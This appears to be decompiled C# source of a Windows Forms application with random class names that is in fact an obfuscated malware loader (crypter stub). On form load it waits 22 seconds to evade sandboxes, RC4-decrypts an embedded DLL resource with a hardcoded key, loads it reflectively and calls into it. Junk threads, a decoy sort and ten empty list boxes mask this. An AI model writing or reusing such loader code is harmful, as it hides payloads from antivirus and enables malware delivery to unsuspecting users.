using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Zqpbticotsdxfcrvyv;

namespace Difnzhwh;

public sealed class a : Form
{
	[Serializable]
	private sealed class a
	{
		public static readonly a a = new a();

		public static ThreadStart b;

		public static ThreadStart c;

		public static ThreadStart d;

		internal void a()
		{
			for (int j = 0; j < 999; j++)
			{
				Console.WriteLine(j);
			}
		}

		internal void b()
		{
			for (int j = 0; j < 999; j++)
			{
				Console.WriteLine(j);
			}
		}

		internal void c()
		{
			for (int j = 0; j < 999; j++)
			{
				Console.WriteLine(j);
			}
		}
	}

	private static class b
	{
		public static CallSite<Func<CallSite, object, object>> a;

		public static CallSite<Action<CallSite, ObjectCollection, object>> b;
	}

	public struct c : IEquatable<c>
	{
		private readonly Guid m_a;

		private readonly string b;

		public c(Guid a, string b)
		{
			this.m_a = a;
			this.b = b;
		}

		public Guid a()
		{
			return this.m_a;
		}

		public string a()
		{
			return b;
		}

		public override bool Equals(object a)
		{
			if (a != null && a.GetType() == GetType())
			{
				return base.Equals((object?)(c)a);
			}
			return false;
		}

		public bool Equals(c a)
		{
			Guid guid = this.m_a;
			return guid.Equals(a.m_a);
		}

		public override int GetHashCode()
		{
			Guid guid = this.m_a;
			return guid.GetHashCode();
		}
	}

	private IContainer m_a;

	private ListBox m_b;

	private ListBox m_c;

	private ListBox d;

	private ListBox e;

	private ListBox f;

	private ListBox g;

	private ListBox h;

	private ListBox i;

	private ListBox j;

	private ListBox k;

	public a()
	{
		b();
	}

	private void a(object sender, EventArgs e)
	{
		try
		{
			int num = 3;
			int[] array = new int[3];
			try
			{
				string[] array2 = new string[3] { "1", "2", "3" };
				for (int j = 0; j < num; j++)
				{
					array[j] = int.Parse(array2[j]);
				}
			}
			catch
			{
			}
			Thread.Sleep(22000);
			AppDomain.CurrentDomain.AssemblyResolve += a;
			a(array);
			for (int k = 0; k < array.Length; k++)
			{
				Console.Write(array[k] + " ");
			}
		}
		catch
		{
			a();
		}
	}

	private byte[] a(byte[] a)
	{
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[a.Length];
		byte[] bytes = Encoding.UTF8.GetBytes("Ssmglxwvmrxazwrh");
		int j;
		for (j = 0; j < 256; j++)
		{
			array[j] = bytes[j % bytes.Length];
			array2[j] = j;
		}
		j = 0;
		int num = 0;
		for (; j < 256; j++)
		{
			num = (num + array2[j] + array[j]) % 256;
			int num2 = array2[j];
			array2[j] = array2[num];
			array2[num] = num2;
		}
		try
		{
			new Thread(Difnzhwh.a.a.a.a).Start();
		}
		catch
		{
		}
		j = 0;
		num = 0;
		int num3 = 0;
		for (; j < a.Length; j++)
		{
			num3++;
			num3 %= 256;
			num += array2[num3];
			num %= 256;
			int num2 = array2[num3];
			array2[num3] = array2[num];
			array2[num] = num2;
			int num4 = array2[(array2[num3] + array2[num]) % 256];
			array3[j] = (byte)(a[j] ^ num4);
		}
		return array3;
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		string name = "Difnzhwh.Zqpbticotsdxfcrvyv.dll";
		Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[manifestResourceStream!.Length];
		manifestResourceStream!.Read(array, 0, array.Length);
		try
		{
			new Thread(Difnzhwh.a.a.a.b).Start();
		}
		catch
		{
		}
		byte[] array2 = this.a(array);
		return (Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array2 });
	}

	private void a()
	{
		Environment.Exit(0);
	}

	public void a(int[] a)
	{
		int num = a.Length;
		for (int j = 0; j < num; j++)
		{
			dynamic val = Activator.CreateInstance(typeof(ClassLibrary));
			try
			{
				new Thread(Difnzhwh.a.a.a.c).Start();
			}
			catch
			{
			}
			for (int k = 0; k < num - j - 1; k++)
			{
				this.k.get_Items().Add(val.Data());
				if (a[k] > a[k + 1])
				{
					int num2 = a[k + 1];
					a[k + 1] = a[k];
					a[k] = num2;
				}
			}
		}
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		((Form)this).Dispose(a);
	}

	private void b()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		this.m_b = new ListBox();
		this.m_c = new ListBox();
		d = new ListBox();
		e = new ListBox();
		f = new ListBox();
		g = new ListBox();
		h = new ListBox();
		i = new ListBox();
		j = new ListBox();
		k = new ListBox();
		((Control)this).SuspendLayout();
		((Control)this.m_b).set_BackColor(SystemColors.WindowFrame);
		((Control)this.m_b).set_Dock((DockStyle)5);
		((ListControl)this.m_b).set_FormattingEnabled(true);
		((Control)this.m_b).set_Location(new Point(0, 0));
		((Control)this.m_b).set_Name("listBox1");
		((Control)this.m_b).set_Size(new Size(535, 290));
		((Control)this.m_b).set_TabIndex(0);
		((Control)this.m_c).set_BackColor(SystemColors.WindowFrame);
		((Control)this.m_c).set_Dock((DockStyle)5);
		((ListControl)this.m_c).set_FormattingEnabled(true);
		((Control)this.m_c).set_Location(new Point(0, 0));
		((Control)this.m_c).set_Name("listBox2");
		((Control)this.m_c).set_Size(new Size(535, 290));
		((Control)this.m_c).set_TabIndex(1);
		((Control)d).set_BackColor(SystemColors.WindowFrame);
		((Control)d).set_Dock((DockStyle)5);
		((ListControl)d).set_FormattingEnabled(true);
		((Control)d).set_Location(new Point(0, 0));
		((Control)d).set_Name("listBox3");
		((Control)d).set_Size(new Size(535, 290));
		((Control)d).set_TabIndex(2);
		((Control)e).set_BackColor(SystemColors.WindowFrame);
		((Control)e).set_Dock((DockStyle)5);
		((ListControl)e).set_FormattingEnabled(true);
		((Control)e).set_Location(new Point(0, 0));
		((Control)e).set_Name("listBox4");
		((Control)e).set_Size(new Size(535, 290));
		((Control)e).set_TabIndex(3);
		((Control)f).set_BackColor(SystemColors.WindowFrame);
		((Control)f).set_Dock((DockStyle)5);
		((ListControl)f).set_FormattingEnabled(true);
		((Control)f).set_Location(new Point(0, 0));
		((Control)f).set_Name("listBox5");
		((Control)f).set_Size(new Size(535, 290));
		((Control)f).set_TabIndex(4);
		((Control)g).set_BackColor(SystemColors.WindowFrame);
		((Control)g).set_Dock((DockStyle)5);
		((ListControl)g).set_FormattingEnabled(true);
		((Control)g).set_Location(new Point(0, 0));
		((Control)g).set_Name("listBox6");
		((Control)g).set_Size(new Size(535, 290));
		((Control)g).set_TabIndex(5);
		((Control)h).set_BackColor(SystemColors.WindowFrame);
		((Control)h).set_Dock((DockStyle)5);
		((ListControl)h).set_FormattingEnabled(true);
		((Control)h).set_Location(new Point(0, 0));
		((Control)h).set_Name("listBox7");
		((Control)h).set_Size(new Size(535, 290));
		((Control)h).set_TabIndex(6);
		((Control)i).set_BackColor(SystemColors.WindowFrame);
		((Control)i).set_Dock((DockStyle)5);
		((ListControl)i).set_FormattingEnabled(true);
		((Control)i).set_Location(new Point(0, 0));
		((Control)i).set_Name("listBox8");
		((Control)i).set_Size(new Size(535, 290));
		((Control)i).set_TabIndex(7);
		((Control)j).set_BackColor(SystemColors.WindowFrame);
		((Control)j).set_Dock((DockStyle)5);
		((ListControl)j).set_FormattingEnabled(true);
		((Control)j).set_Location(new Point(0, 0));
		((Control)j).set_Name("listBox9");
		((Control)j).set_Size(new Size(535, 290));
		((Control)j).set_TabIndex(8);
		((Control)k).set_BackColor(SystemColors.WindowFrame);
		((Control)k).set_Dock((DockStyle)5);
		((ListControl)k).set_FormattingEnabled(true);
		((Control)k).set_Location(new Point(0, 0));
		((Control)k).set_Name("listBox10");
		((Control)k).set_Size(new Size(535, 290));
		((Control)k).set_TabIndex(9);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(535, 290));
		((Control)this).get_Controls().Add((Control)(object)k);
		((Control)this).get_Controls().Add((Control)(object)j);
		((Control)this).get_Controls().Add((Control)(object)i);
		((Control)this).get_Controls().Add((Control)(object)h);
		((Control)this).get_Controls().Add((Control)(object)g);
		((Control)this).get_Controls().Add((Control)(object)f);
		((Control)this).get_Controls().Add((Control)(object)e);
		((Control)this).get_Controls().Add((Control)(object)d);
		((Control)this).get_Controls().Add((Control)(object)this.m_c);
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
